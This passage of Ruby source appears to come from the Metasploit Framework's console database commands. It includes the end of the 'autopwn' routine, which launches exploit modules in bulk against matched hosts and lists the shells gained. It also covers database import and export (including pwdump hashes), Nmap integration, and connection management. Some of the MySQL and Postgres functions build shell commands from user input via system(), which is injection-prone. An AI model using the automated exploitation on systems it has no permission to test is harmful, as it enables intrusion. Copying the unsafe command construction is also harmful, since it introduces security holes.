						autopwn_jobs << framework.threads.spawn("AutoPwnJob#{xref[3]}", false, mod) do |xmod|
							begin
							stime = Time.now.to_f
							::Timeout.timeout(maxtime) do
									inp = (mode & PWN_SLNT != 0) ? nil : driver.input
									out = (mode & PWN_SLNT != 0) ? nil : driver.output

									case xmod.type
									when MODULE_EXPLOIT
										xmod.exploit_simple(
											'Payload'        => xmod.datastore['PAYLOAD'],
											'LocalInput'     => inp,
											'LocalOutput'    => out,
											'RunAsJob'       => false)
									when MODULE_AUX
										xmod.run_simple(
											'LocalInput'     => inp,
											'LocalOutput'    => out,
											'RunAsJob'       => false)
									end
								end

							rescue ::Timeout::Error
								print_status(" >> autopwn module timeout from #{xmod.fullname} after #{Time.now.to_f - stime} seconds")
							rescue ::Exception
								print_status(" >> autopwn exception during launch from #{xmod.fullname}: #{$!} ")
							end
						end
					end

				rescue ::Interrupt
					raise $!

				rescue ::Exception
					print_status(" >> autopwn exception from #{xref[3]}: #{$!} #{$!.backtrace}")
				end
			end

			# Wait on all the jobs we just spawned
			while (not autopwn_jobs.empty?)
				# All running jobs are stored in framework.jobs.  If it's
				# not in this list, it must have completed.
				autopwn_jobs.delete_if { |j| not j.alive? }

				print_status("(#{matches.length}/#{matches.length} [#{framework.sessions.length} sessions]): Waiting on #{autopwn_jobs.length} launched modules to finish execution...")
				::IO.select(nil, nil, nil, 5.0)
			end

			if (mode & PWN_SHOW != 0 and mode & PWN_EXPL != 0)
				print_status("The autopwn command has completed with #{framework.sessions.length} sessions")
				if(framework.sessions.length > 0)
					print_status("Enter sessions -i [ID] to interact with a given session ID")
					print_status("")
					print_status("=" * 80)
					driver.run_single("sessions -l -v")
					print_status("=" * 80)
				end
			end
			print_line("")
		# EOM
		end

		#
		# Determine if an IP address is inside a given range
		#
		def range_include?(ranges, addr)
			ranges.each do |range|
				return true if range.include? addr
			end
			false
		end

		def cmd_db_import_tabs(str, words)
			tab_complete_filenames(str, words)
		end

		# Informs about the superior cmd_db_import function.
		def warn_about_db_import(arg)
			return nil unless caller[0][/:in `cmd_(.*)'/] # `fix higlighting
			triggering_function = $1
			print_error "The command '#{triggering_function}' is deprecated; use 'db_import #{arg}' instead."
		end

		def cmd_db_import_help
			print_line "Usage: db_import <filename> [file2...]"
			print_line
			print_line "filenames can be globs like *.xml, or **/*.xml which will search recursively"
			print_line
		end

		#
		# Generic import that automatically detects the file type
		#
		def cmd_db_import(*args)
			return unless active?
			if (args.include?("-h") or not (args and args.length > 0))
				cmd_db_import_help
				return
			end
			args.each { |glob|
				files = Dir.glob(File.expand_path(glob))
				if files.empty?
					print_error("No such file #{glob}")
					next
				end
				files.each { |filename|
					if (not File.readable?(filename))
						print_error("Could not read file #{filename}")
						next
					end
					begin
						warnings = 0
						framework.db.import_file(:filename => filename) do |type,data|
							case type
							when :debug
								print_error("DEBUG: #{data.inspect}")
							when :vuln
								inst = data[1] == 1 ? "instance" : "instances"
								print_status("Importing vulnerability '#{data[0]}' (#{data[1]} #{inst})")
							when :filetype
								print_status("Importing '#{data}' data")
							when :parser
								print_status("Import: Parsing with '#{data}'")
							when :address
								print_status("Importing host #{data}")
							when :service
								print_status("Importing service #{data}")
							when :msf_loot
								print_status("Importing loot #{data}")
							when :msf_task
								print_status("Importing task #{data}")
							when :msf_report
								print_status("Importing report #{data}")
							when :pcap_count
								print_status("Import: #{data} packets processed")
							when :record_count
								print_status("Import: #{data[1]} records processed")
							when :warning
								print_error("")
								data.split("\n").each do |line|
									print_error(line)
								end
								print_error("")
								warnings += 1
							end
						end
						print_status("Successfully imported #{filename}")
						
						print_error("Please note that there were #{warnings} warnings") if warnings > 1
						print_error("Please note that there was one warning") if warnings == 1

					rescue DBImportError
						print_error("Failed to import #{filename}: #{$!}")
						elog("Failed to import #{filename}: #{$!.class}: #{$!}")
						dlog("Call stack: #{$@.join("\n")}", LEV_3)
						next
					rescue REXML::ParseException => e
						print_error("Failed to import #{filename} due to malformed XML:")
						print_error "#{$!.class}: #{$!}"
						elog("Failed to import #{filename}: #{$!.class}: #{$!}")
						dlog("Call stack: #{$@.join("\n")}", LEV_3)
						next
					end
				}
			}
		end

		def cmd_db_export_help
			# Like db_hosts and db_services, this creates a list of columns, so
			# use its -h
			cmd_db_export("-h")
		end

		#
		# Export an XML
		#
		def cmd_db_export(*args)
			return unless active?

			export_formats = %W{xml pwdump}
			format = 'xml'
			output = nil

			while (arg = args.shift)
				case arg
				when '-h','--help'
					print_line("Usage:")
					print_line("    db_export -f <format> [-a] [filename]")
					print_line("    Format can be one of: #{export_formats.join(", ")}")
				when '-f','--format'
					format = args.shift.to_s.downcase
				else
					output = arg
				end
			end
			
			if not output
				print_error("No output file was specified")
				return
			end
			
			if not export_formats.include?(format)
				print_error("Unsupported file format: #{format}")
				print_error("Unsupported file format: '#{format}'. Must be one of: #{export_formats.join(", ")}")
				return
			end
			
			print_status("Starting export of workspace #{framework.db.workspace.name} to #{output} [ #{format} ]...")
			exporter = Msf::DBManager::Export.new(framework.db.workspace)

			exporter.send("to_#{format}_file".intern,output) do |mtype, mstatus, mname|
				if mtype == :status
					if mstatus == "start"
						print_status("    >> Starting export of #{mname}")
					end
					if mstatus == "complete"
						print_status("    >> Finished export of #{mname}")
					end					
				end
			end
			print_status("Finished export of workspace #{framework.db.workspace.name} to #{output} [ #{format} ]...")
		end

		#
		# Import Nmap data from a file
		#
		def cmd_db_nmap(*args)
			return unless active?
			if (args.length == 0)
				print_status("Usage: db_nmap [nmap options]")
				return
			end

			nmap =
				Rex::FileUtils.find_full_path("nmap") ||
				Rex::FileUtils.find_full_path("nmap.exe")

			if (not nmap)
				print_error("The nmap executable could not be found")
				return
			end

			fd = Tempfile.new('dbnmap')
			fd.binmode
			
			fo = Tempfile.new('dbnmap')
			fo.binmode

			# When executing native Nmap in Cygwin, expand the Cygwin path to a Win32 path
			if(Rex::Compat.is_cygwin and nmap =~ /cygdrive/)
				# Custom function needed because cygpath breaks on 8.3 dirs
				tout = Rex::Compat.cygwin_to_win32(fd.path)
				fout = Rex::Compat.cygwin_to_win32(fo.path)
				args.push('-oX', tout)
				args.push('-oN', fout)
			else
				args.push('-oX', fd.path)
				args.push('-oN', fo.path)
			end

			begin
				nmap_pipe = ::Open3::popen3([nmap, "nmap"], *args)
				temp_nmap_threads = []
				temp_nmap_threads << framework.threads.spawn("db_nmap-Stdout", false, nmap_pipe[1]) do |np_1|
					np_1.each_line do |nmap_out|
						next if nmap_out.strip.empty?
						print_status "Nmap: #{nmap_out.strip}"
					end
				end

				temp_nmap_threads << framework.threads.spawn("db_nmap-Stderr", false, nmap_pipe[2]) do |np_2|
					np_2.each_line do |nmap_err|
						next if nmap_err.strip.empty?
						print_status  "Nmap: '#{nmap_err.strip}'"
					end
				end

				temp_nmap_threads.map {|t| t.join rescue nil}
				nmap_pipe.each {|p| p.close rescue nil}
			rescue ::IOError
			end

			fo.close(true)
			framework.db.import_nmap_xml_file(:filename => fd.path)
			fd.close(true)
		end

		#
		# Database management
		#

		def db_check_driver
			if(not framework.db.driver)
				print_error("No database driver has been specified")
				return false
			end
			true
		end

		#
		# Is everything working?
		#
		def cmd_db_status(*args)
			if framework.db.driver
				if ActiveRecord::Base.connected? and ActiveRecord::Base.connection.active?
					if ActiveRecord::Base.connection.respond_to? :current_database
						cdb = ActiveRecord::Base.connection.current_database
					end
					print_status("#{framework.db.driver} connected to #{cdb}")
				else
					print_status("#{framework.db.driver} selected, no connection")
				end
			else
				print_status("No driver selected")
			end
		end

		def cmd_db_driver(*args)

			if(args[0])
				if(args[0] == "-h" || args[0] == "--help")
					print_status("Usage: db_driver [driver-name]")
					return
				end

				if(framework.db.drivers.include?(args[0]))
					framework.db.driver = args[0]
					print_status("Using database driver #{args[0]}")
				else
					print_error("Invalid driver specified")
				end
				return
			end

			if(framework.db.driver)
				print_status("   Active Driver: #{framework.db.driver}")
			else
				print_status("No Active Driver")
			end
			print_status("       Available: #{framework.db.drivers.join(", ")}")
			print_line("")

			if ! framework.db.drivers.include?('mysql')
				print_status("    DB Support: Enable the mysql driver with the following command:")
				print_status("                $ gem install mysql")
				print_status("    This gem requires mysqlclient headers, which can be installed on Ubuntu with:")
				print_status("                $ sudo apt-get install libmysqlclient-dev")
				print_line("")
			end

			if ! framework.db.drivers.include?('postgresql')
				print_status("    DB Support: Enable the postgresql driver with the following command:")
				print_status("                  * This requires libpq-dev and a build environment")
				print_status("                $ gem install postgres")
				print_status("                $ gem install pg # is an alternative that may work")
				print_line("")
			end
		end

		def cmd_db_driver_tabs(str, words)
			return framework.db.drivers
		end

		def cmd_db_create(*args)
			return if not db_check_driver
			print_error("")
			print_error("Warning: The db_create command is deprecated, use db_connect instead.")
			print_error("         The database and schema will be created automatically by")
			print_error("         db_connect. If db_connect fails to create the database, create")
			print_error("         it manually with your DBMS's administration tools.")
			print_error("")

			meth = "db_create_#{framework.db.driver}"
			if(self.respond_to?(meth))
				self.send(meth, *args)
			else
				print_error("This database driver #{framework.db.driver} is not currently supported")
			end
		end

		def cmd_db_destroy(*args)
			return if not db_check_driver

			if(args[0] and (args[0] == "-h" || args[0] == "--help"))
				print_status("Usage: db_destroy [<user:pass>@<host:port>/<database>]")
				return
			end

			meth = "db_destroy_#{framework.db.driver}"
			if(self.respond_to?(meth))
				self.send(meth, *args)
			else
				print_error("This database driver #{framework.db.driver} is not currently supported")
			end
		end

		def cmd_db_connect_help
			# Help is specific to each driver
			cmd_db_connect("-h")
		end

		def cmd_db_connect(*args)
			return if not db_check_driver
			if (args[0] == "-y")
				if (args[1] and not File.exists? File.expand_path(args[1]))
					print_error("File not found")
					return
				end
				file = args[1] || File.join(Msf::Config.get_config_root, "database.yml")
				if (File.exists? File.expand_path(file))
					db = YAML.load(File.read(file))['production']
					cmd_db_driver(db['adapter'])
					framework.db.connect(db)
					return
				end
			end
			meth = "db_connect_#{framework.db.driver}"
			if(self.respond_to?(meth))
				self.send(meth, *args)
			else
				print_error("This database driver #{framework.db.driver} is not currently supported")
			end
		end

		def cmd_db_disconnect_help
			print_line "Usage: db_disconnect"
			print_line
			print_line "Disconnect from the database."
			print_line
		end

		def cmd_db_disconnect(*args)
			return if not db_check_driver

			if(args[0] and (args[0] == "-h" || args[0] == "--help"))
				cmd_db_disconnect_help
				return
			end

			if (framework.db)
				framework.db.disconnect()
			end
		end


		#
		# Set RHOSTS in the +active_module+'s (or global if none) datastore from an array of addresses
		#
		# This stores all the addresses to a temporary file and utilizes the
		# <pre>file:/tmp/filename</pre> syntax to confer the addrs.  +rhosts+
		# should be an Array.  NOTE: the temporary file is *not* deleted
		# automatically.
		#
		def set_rhosts_from_addrs(rhosts)
			if rhosts.empty?
				print_status "The list is empty, cowardly refusing to set RHOSTS"
				return
			end
			if active_module
				mydatastore = active_module.datastore
			else
				# if there is no module in use set the list to the global variable
				mydatastore = self.framework.datastore
			end

			if rhosts.length > 5
				# Lots of hosts makes 'show options' wrap which is difficult to
				# read, store to a temp file
				rhosts_file = Rex::Quickfile.new("msf-db-rhosts-")
				mydatastore['RHOSTS'] = 'file:'+rhosts_file.path
				# create the output file and assign it to the RHOSTS variable					
				rhosts_file.write(rhosts.join("\n")+"\n")
				rhosts_file.close
			else
				# For short lists, just set it directly
				mydatastore['RHOSTS'] = rhosts.join(" ")
			end

			print_line "RHOSTS => #{mydatastore['RHOSTS']}"
			print_line
		end


		def db_find_tools(tools)
			found   = true
			missed  = []
			tools.each do |name|
				if(! Rex::FileUtils.find_full_path(name))
					missed << name
				end
			end
			if(not missed.empty?)
				print_error("This database command requires the following tools to be installed: #{missed.join(", ")}")
				return
			end
			true
		end


		#
		# Database management: MySQL
		#

		#
		# Connect to an existing MySQL database
		#
		def db_connect_mysql(*args)
			if(args[0] == nil or args[0] == "-h" or args[0] == "--help")
				print_status("   Usage: db_connect <user:pass>@<host:port>/<database>")
				print_status("      OR: db_connect -y [path/to/database.yml]")
				print_status("Examples:")
				print_status("       db_connect user@metasploit3")
				print_status("       db_connect user:pass@192.168.0.2/metasploit3")
				print_status("       db_connect user:pass@192.168.0.2:1500/metasploit3")
				return
			end

			info = db_parse_db_uri_mysql(args[0])
			opts = { 'adapter' => 'mysql' }

			opts['username'] = info[:user] if (info[:user])
			opts['password'] = info[:pass] if (info[:pass])
			opts['database'] = info[:name]
			opts['host'] = info[:host] if (info[:host])
			opts['port'] = info[:port] if (info[:port])

			opts['host'] ||= 'localhost'

			# This is an ugly hack for a broken MySQL adapter:
			# 	http://dev.rubyonrails.org/ticket/3338
			if (opts['host'].strip.downcase == 'localhost')
				opts['host'] = Socket.gethostbyname("localhost")[3].unpack("C*").join(".")
			end

			if (not framework.db.connect(opts))
				raise RuntimeError.new("Failed to connect to the database: #{framework.db.error}")
			end
		end

		#
		# Create a new MySQL database instance
		#
		def db_create_mysql(*args)

			cmd_db_disconnect()

			if(args[0] == nil or args[0] == "-h" or args[0] == "--help")
				print_status("   Usage: db_create <user:pass>@<host:port>/<database>")
				print_status("Examples:")
				print_status("       db_create user@metasploit3")
				print_status("       db_create user:pass@192.168.0.2/metasploit3")
				print_status("       db_create user:pass@192.168.0.2:1500/metasploit3")
				return
			end

			return if ! db_find_tools(%W{mysqladmin mysql})

			info = db_parse_db_uri_mysql(args[0])
			opts = { 'adapter' => 'mysql' }

			argv = []

			if (info[:user])
				opts['username'] = info[:user]
				argv.push('-u')
				argv.push(info[:user])
			end

			if (info[:pass])
				argv.push('--password=' + info[:pass])
				opts['password'] = info[:pass]
			end

			if (info[:host])
				opts['host'] = info[:host]
				argv.push('-h')
				argv.push(info[:host])
			end

			if (info[:port])
				opts['port'] = info[:port]
				argv.push('-P')
				argv.push(info[:port])

				# This is an ugly hack for a broken MySQL adapter:
				# 	http://dev.rubyonrails.org/ticket/3338
				if (opts['host'].strip.downcase == 'localhost')
					opts['host'] = Socket.gethostbyname("localhost")[3].unpack("C*").join(".")
				end
			end

			argv.push('-f')

			opts['database'] = info[:name]

			cargs = argv.map{|c| "'#{c}' "}.join

			system("mysqladmin #{cargs} drop #{info[:name]} >/dev/null 2>&1")
			system("mysqladmin #{cargs} create #{info[:name]}")

			if (not framework.db.connect(opts))
				raise RuntimeError.new("Failed to connect to the database: #{framework.db.error}")
			end

			print_status("Database creation complete (check for errors)")
		end

		#
		# Drop an existing database
		#
		def db_destroy_mysql(*args)

			cmd_db_disconnect()

			return if ! db_find_tools(%W{mysqladmin})

			info = db_parse_db_uri_mysql(args[0])
			argv = []

			if (info[:user])
				argv.push('-u')
				argv.push(info[:user])
			end

			if (info[:pass])
				argv.push('--password=' + info[:pass])
			end

			if (info[:host])
				argv.push('-h')
				argv.push(info[:host])
			end

			if (info[:port])
				argv.push('-P')
				argv.push(info[:port])
			end

			argv.push("-f")

			cargs = argv.map{|c| "'#{c}' "}.join
			system("mysqladmin -f #{cargs} drop #{info[:name]}")
		end

		def db_parse_db_uri_mysql(path)
			res = {}
			if (path)
				auth, dest = path.split('@')
				(dest = auth and auth = nil) if not dest
				res[:user],res[:pass] = auth.split(':') if auth
				targ,name = dest.split('/')
				(name = targ and targ = nil) if not name
				res[:host],res[:port] = targ.split(':') if targ
			end
			res[:name] = name || 'metasploit3'
			res
		end


		#
		# Database management: Postgres
		#

		#
		# Connect to an existing Postgres database
		#
		def db_connect_postgresql(*args)
			if(args[0] == nil or args[0] == "-h" or args[0] == "--help")
				print_status("   Usage: db_connect <user:pass>@<host:port>/<database>")
				print_status("      OR: db_connect -y [path/to/database.yml]")
				print_status("Examples:")
				print_status("       db_connect user@metasploit3")
				print_status("       db_connect user:pass@192.168.0.2/metasploit3")
				print_status("       db_connect user:pass@192.168.0.2:1500/metasploit3")
				return
			end

			info = db_parse_db_uri_postgresql(args[0])
			opts = { 'adapter' => 'postgresql' }

			opts['username'] = info[:user] if (info[:user])
			opts['password'] = info[:pass] if (info[:pass])
			opts['database'] = info[:name]
			opts['host'] = info[:host] if (info[:host])
			opts['port'] = info[:port] if (info[:port])

			opts['pass'] ||= ''

			# Do a little legwork to find the real database socket
			if(! opts['host'])
				while(true)
					done = false
					dirs = %W{ /var/run/postgresql /tmp }
					dirs.each do |dir|
						if(::File.directory?(dir))
							d = ::Dir.new(dir)
							d.entries.grep(/^\.s\.PGSQL.(\d+)$/).each do |ent|
								opts['port'] = ent.split('.')[-1].to_i
								opts['host'] = dir
								done = true
								break
							end
						end
						break if done
					end
					break
				end
			end

			# Default to loopback
			if(! opts['host'])
				opts['host'] = '127.0.0.1'
			end

			if (not framework.db.connect(opts))
				raise RuntimeError.new("Failed to connect to the database: #{framework.db.error}")
			end
		end

		#
		# Create a new Postgres database instance
		#
		def db_create_postgresql(*args)
			cmd_db_disconnect()

			if(args[0] == nil or args[0] == "-h" or args[0] == "--help")
				print_status("   Usage: db_create <user:pass>@<host:port>/<database>")
				print_status("Examples:")
				print_status("       db_create user@metasploit3")
				print_status("       db_create user:pass@192.168.0.2/metasploit3")
				print_status("       db_create user:pass@192.168.0.2:1500/metasploit3")
				return
			end

			return if ! db_find_tools(%W{psql dropdb createdb})

			info = db_parse_db_uri_postgresql(args[0])
			opts = { 'adapter' => 'postgresql' }
			argv = []

			if (info[:user])
				opts['username'] = info[:user]
				argv.push('-U')
				argv.push(info[:user])
			else
				opts['username'] = 'postgres'
				argv.push('-U')
				argv.push('postgres')
			end

			if (info[:pass])
				print()
				print_status("Warning: You will need to enter the password at the prompts below")
				print()
				argv.push('-W')
			end

			if (info[:host])
				opts['host'] = info[:host]
				argv.push('-h')
				argv.push(info[:host])
			end

			if (info[:port])
				opts['port'] = info[:port]
				argv.push('-p')
				argv.push(info[:port])
			end

			opts['database'] = info[:name]

			cargs = argv.map{|c| "'#{c}' "}.join

			system("dropdb #{cargs} #{info[:name]} >/dev/null 2>&1")
			system("createdb #{cargs} #{info[:name]}")

			opts['password'] = info[:pass] || ''

			# Do a little legwork to find the real database socket
			if(! opts['host'])
				while(true)
					done = false
					dirs = %W{ /var/run/postgresql /tmp }
					dirs.each do |dir|
						if(::File.directory?(dir))
							d = ::Dir.new(dir)
							d.entries.grep(/^\.s\.PGSQL.(\d+)$/).each do |ent|
								opts['port'] = ent.split('.')[-1].to_i
								opts['host'] = dir
								done = true
								break
							end
						end
						break if done
					end
					break
				end
			end

			# Default to loopback
			if(! opts['host'])
				opts['host'] = '127.0.0.1'
			end

			if (not framework.db.connect(opts))
				raise RuntimeError.new("Failed to connect to the database: #{framework.db.error}")
			end

			print_status("Database creation complete (check for errors)")
		end

		#
		# Drop an existing database
		#
		def db_destroy_postgresql(*args)

			cmd_db_disconnect()

			return if ! db_find_tools(%W{dropdb})

			info = db_parse_db_uri_postgresql(args[0])
			argv = []

			if (info[:user])
				argv.push('-U')
				argv.push(info[:user])
			end

			if (info[:pass])
				print()
				print_status("Warning: You will need to enter the password at the prompts below")
				print()
				argv.push('-W')
			end

			if (info[:host])
				argv.push('-h')
				argv.push(info[:host])
			end

			if (info[:port])
				argv.push('-p')
				argv.push(info[:port])
			end

			cargs = argv.map{|c| "'#{c}' "}.join
			system("dropdb #{cargs} #{info[:name]}")
		end

		def db_parse_db_uri_postgresql(path)
			res = {}
			if (path)
				auth, dest = path.split('@')
				(dest = auth and auth = nil) if not dest
				res[:user],res[:pass] = auth.split(':') if auth
				targ,name = dest.split('/')
				(name = targ and targ = nil) if not name
				res[:host],res[:port] = targ.split(':') if targ
			end
			res[:name] = name || 'metasploit3'
			res
		end

end
end
end
end
end

